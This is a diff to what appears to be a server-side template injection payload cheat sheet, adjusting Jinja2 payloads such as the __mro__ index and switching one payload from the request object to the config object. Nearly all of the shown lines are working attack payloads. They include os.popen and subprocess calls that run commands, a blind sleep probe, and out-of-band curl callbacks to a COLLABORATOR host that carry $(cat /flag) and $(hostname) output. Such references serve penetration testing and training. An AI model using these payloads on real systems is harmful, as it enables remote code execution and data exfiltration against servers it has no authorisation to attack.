@@ -62,7 +62,7 @@ ${7*7}            # Mako / Vue.js template literal
 {{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()[0]}}
 
 # Via request object (always in Flask context)
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 
 # Via lipsum / cycler / joiner (builtin Jinja2 globals)
 {{lipsum.__globals__['os'].popen('id').read()}}
@@ -70,7 +70,7 @@ ${7*7}            # Mako / Vue.js template literal
 {{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}
 
 # Blind SSTI via sleep
-{{''.__class__.__mro__[2].__subclasses__()[X]('sleep 5',shell=True,stdout=-1).communicate()}}
+{{''.__class__.__mro__[1].__subclasses__()[X]('sleep 5',shell=True,stdout=-1).communicate()}}
 
 # Blind SSTI via curl callback
 {{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('curl http://COLLABORATOR/$(cat /flag)').read()}}
@@ -225,7 +225,7 @@ ${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray
 
 - `{{7*7}}` returns `49` confirms SSTI is active
 - Engine-specific probe `{{7*'7'}}` distinguishes Twig from Jinja2
-- Blind SSTI: `{{''.__class__.__mro__[2].__subclasses__()[X]('sleep 5',shell=True)}}` causes 5-second delay
+- Blind SSTI: `{{''.__class__.__mro__[1].__subclasses__()[X]('sleep 5',shell=True)}}` causes 5-second delay
 - Out-of-band: `{{self.__init__.__globals__.__builtins__.__import__('os').popen('curl COLLABORATOR/$(hostname)')}}` delivers DNS/HTTP callback
 
 ## Pitfalls
